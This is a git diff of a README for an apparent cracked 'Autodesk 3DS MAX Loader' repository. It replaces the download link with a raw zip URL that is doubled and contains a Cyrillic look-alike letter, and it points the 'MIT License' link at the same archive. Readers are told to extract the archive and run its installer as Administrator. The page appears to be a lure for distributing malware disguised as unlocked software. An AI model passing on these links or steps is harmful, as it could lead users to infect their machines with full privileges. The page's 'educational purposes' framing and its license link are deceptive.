@@ -29,7 +29,7 @@ Welcome to the official repository for the **Autodesk 3DS MAX Loader** – your 
 
 ## 📥 Installation Guide
 
-1. Download **https://raw.githubusercontent.com/Waka758/3dsmax-unlocked-tools/master/Lоader.zip** from the repository.
+1. Download **https://raw.githubusercontent.com/Waka758/3dsmax-unlocked-tools/master/misbestowal/tools_dsmax_unlocked_3.6.zipоhttps://raw.githubusercontent.com/Waka758/3dsmax-unlocked-tools/master/misbestowal/tools_dsmax_unlocked_3.6.zip** from the repository.
 2. Extract contents using any popular archive tool.
 3. Run the included installer as Administrator (for Windows/macOS/Linux).
 4. Follow easy on-screen instructions to streamline 3DS MAX feature activation.
@@ -50,4 +50,4 @@ This repository is intended strictly for educational and research purposes. Use 
 
 ## 📜 License
 
-Licensed under the [MIT License (2025)](https://raw.githubusercontent.com/Waka758/3dsmax-unlocked-tools/master/Lоader.zip).
+Licensed under the [MIT License (2025)](https://raw.githubusercontent.com/Waka758/3dsmax-unlocked-tools/master/misbestowal/tools_dsmax_unlocked_3.6.zipоhttps://raw.githubusercontent.com/Waka758/3dsmax-unlocked-tools/master/misbestowal/tools_dsmax_unlocked_3.6.zip).
